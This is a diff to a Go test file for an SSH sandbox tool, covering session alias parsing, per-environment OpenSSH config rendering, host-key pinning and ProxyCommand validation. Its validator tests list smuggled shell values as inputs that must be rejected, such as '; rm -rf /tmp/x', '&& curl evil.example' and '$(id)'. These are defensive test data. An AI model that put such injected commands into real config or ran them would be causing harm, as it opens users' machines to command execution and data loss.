@@ -16,37 +16,109 @@ import (
 	cryptossh "golang.org/x/crypto/ssh"
 )
 
-func TestParseSessionAliasUsesRightmostSandboxID(t *testing.T) {
-	parsed, err := ParseSessionAlias("my.team.sbx-123.amika")
+func TestParseSessionAliasPopsEnvironmentAndIDFromTheRight(t *testing.T) {
+	parsed, err := ParseSessionAlias("my.team.sbx-123.localhost-3011.amika")
 	if err != nil {
 		t.Fatalf("ParseSessionAlias: %v", err)
 	}
-	if parsed.Name != "my.team" || parsed.ID != "sbx-123" {
+	if parsed.Name != "my.team" || parsed.ID != "sbx-123" || parsed.Environment != "localhost-3011" {
 		t.Fatalf("parsed = %#v", parsed)
 	}
 }
 
-func TestRenderSessionConfigPinsHostKeysAndFetchesEveryDial(t *testing.T) {
-	config, err := RenderSessionConfig(SessionConfig{
-		IdentityFile:   "/home/user/.ssh/amika_id_ed25519",
-		KnownHostsFile: "/home/user/.ssh/amika_known_hosts",
-		ProxyCommand:   "amika plumbing ssh-stdio-proxy %h",
-	})
+func TestBuildSessionAliasRoundTripsThroughParse(t *testing.T) {
+	alias, err := BuildSessionAlias("my.team", "sbx-123", "app-amika-dev")
+	if err != nil {
+		t.Fatalf("BuildSessionAlias: %v", err)
+	}
+	if alias != "my.team.sbx-123.app-amika-dev.amika" {
+		t.Fatalf("alias = %q", alias)
+	}
+	parsed, err := ParseSessionAlias(alias)
+	if err != nil {
+		t.Fatalf("ParseSessionAlias: %v", err)
+	}
+	if parsed.Name != "my.team" || parsed.ID != "sbx-123" || parsed.Environment != "app-amika-dev" {
+		t.Fatalf("parsed = %#v", parsed)
+	}
+}
+
+// A dot in the environment would be popped as its own segment and shift every
+// other field, so it must be refused at build time.
+func TestBuildSessionAliasRejectsDottedEnvironment(t *testing.T) {
+	if _, err := BuildSessionAlias("team", "sbx-123", "app.amika.dev"); err == nil {
+		t.Fatal("expected a dotted environment to be rejected")
+	}
+}
+
+func TestRenderSessionConfigScopesTheWildcardToOneEnvironment(t *testing.T) {
+	config, err := RenderSessionConfig(
+		"localhost-3011",
+		"/Users/dev/bin/amika-local plumbing ssh-stdio-proxy %h",
+		SessionConfig{
+			IdentityFile:   "/home/user/.ssh/amika_id_ed25519",
+			KnownHostsFile: "/home/user/.ssh/amika_known_hosts",
+		},
+	)
 	if err != nil {
 		t.Fatalf("RenderSessionConfig: %v", err)
 	}
 	for _, line := range []string{
-		"Host *.amika",
+		"Host *.localhost-3011.amika",
 		"User amika",
 		"IdentityFile /home/user/.ssh/amika_id_ed25519",
 		"IdentitiesOnly yes",
 		"StrictHostKeyChecking yes",
 		"UserKnownHostsFile /home/user/.ssh/amika_known_hosts",
-		"ProxyCommand amika plumbing ssh-stdio-proxy %h",
+		"ProxyCommand /Users/dev/bin/amika-local plumbing ssh-stdio-proxy %h",
 		"ServerAliveInterval 15",
 	} {
 		if !strings.Contains(config, line) {
 			t.Errorf("config missing %q:\n%s", line, config)
+		}
+	}
+	// A bare `*.amika` would also match every other environment's aliases and
+	// win the ProxyCommand for them, since OpenSSH takes the first value found.
+	if strings.Contains(config, "Host *.amika") {
+		t.Errorf("config still has an environment-agnostic wildcard:\n%s", config)
+	}
+}
+
+// OpenSSH hands the ProxyCommand line to a shell, so only an absolute, clean,
+// metacharacter-free executable path may be embedded in it.
+func TestProxyCommandRejectsUnsafeExecutablePaths(t *testing.T) {
+	for _, binaryPath := range []string{
+		"amika",
+		"bin/amika",
+		"/usr/local/bin/amika; rm -rf /tmp/x",
+		"/usr/local/bin/amika && curl evil.example",
+		"/usr/local/bin/$(id)/amika",
+		"/usr/local/bin/amika `id`",
+		"/usr/local/bin/my amika",
+		"/usr/local/bin/amika%h",
+		"/usr/local/../bin/amika",
+	} {
+		if _, err := BuildProxyCommand(binaryPath); err == nil {
+			t.Errorf("BuildProxyCommand(%q) was accepted", binaryPath)
+		}
+	}
+}
+
+func TestParseProxyCommandRequiresTheFixedInvocation(t *testing.T) {
+	binaryPath, err := ParseProxyCommand("/usr/local/bin/amika plumbing ssh-stdio-proxy %h")
+	if err != nil {
+		t.Fatalf("ParseProxyCommand: %v", err)
+	}
+	if binaryPath != "/usr/local/bin/amika" {
+		t.Fatalf("binary path = %q", binaryPath)
+	}
+	for _, proxyCommand := range []string{
+		"/usr/local/bin/amika sandbox delete everything",
+		"/usr/local/bin/amika plumbing ssh-stdio-proxy",
+		"/usr/local/bin/amika plumbing ssh-stdio-proxy %h; id",
+	} {
+		if _, err := ParseProxyCommand(proxyCommand); err == nil {
+			t.Errorf("ParseProxyCommand(%q) was accepted", proxyCommand)
 		}
 	}
 }
@@ -54,13 +126,13 @@ func TestRenderSessionConfigPinsHostKeysAndFetchesEveryDial(t *testing.T) {
 func TestKnownHostLinePinsTheAliasToTheExactHostKey(t *testing.T) {
 	hostKey := testHostKey(t)
 	line, err := KnownHostLine(
-		"my.team.sbx-123.amika",
+		"my.team.sbx-123.localhost-3011.amika",
 		hostKey+" host-comment",
 	)
 	if err != nil {
 		t.Fatalf("KnownHostLine: %v", err)
 	}
-	if line != "my.team.sbx-123.amika "+hostKey+"\n" {
+	if line != "my.team.sbx-123.localhost-3011.amika "+hostKey+"\n" {
 		t.Fatalf("known-host line = %q", line)
 	}
 }
@@ -90,7 +162,7 @@ func TestPrepareSessionHostPinsAPIHostKeyBeforeOpenSSH(t *testing.T) {
 		creator,
 		pins,
 		"sbx_123",
-		"my.team.sbx_123.amika",
+		"my.team.sbx_123.localhost-3011.amika",
 	)
 	if err != nil {
 		t.Fatalf("PrepareSessionHost: %v", err)
@@ -98,7 +170,7 @@ func TestPrepareSessionHostPinsAPIHostKeyBeforeOpenSSH(t *testing.T) {
 	if session.SandboxID != "sbx_123" || creator.calls != 1 {
 		t.Fatalf("session = %#v, creator calls = %d", session, creator.calls)
 	}
-	if pins.calls != 1 || pins.alias != "my.team.sbx_123.amika" || pins.key != creator.hostKey {
+	if pins.calls != 1 || pins.alias != "my.team.sbx_123.localhost-3011.amika" || pins.key != creator.hostKey {
 		t.Fatalf("pin calls = %d alias = %q key = %q", pins.calls, pins.alias, pins.key)
 	}
 }
@@ -156,7 +228,7 @@ func TestProxySessionCreatesSessionAndCopiesBytes(t *testing.T) {
 		context.Background(),
 		creator,
 		dialer,
-		"my.team.sbx_123.amika",
+		"my.team.sbx_123.localhost-3011.amika",
 		strings.NewReader("from-openssh"),
 		&stdout,
 	)
@@ -189,7 +261,7 @@ func TestProxySessionAcceptsNormalWebSocketClosure(t *testing.T) {
 		context.Background(),
 		creator,
 		dialer,
-		"my.team.sbx_123.amika",
+		"my.team.sbx_123.localhost-3011.amika",
 		strings.NewReader(""),
 		io.Discard,
 	); err != nil {
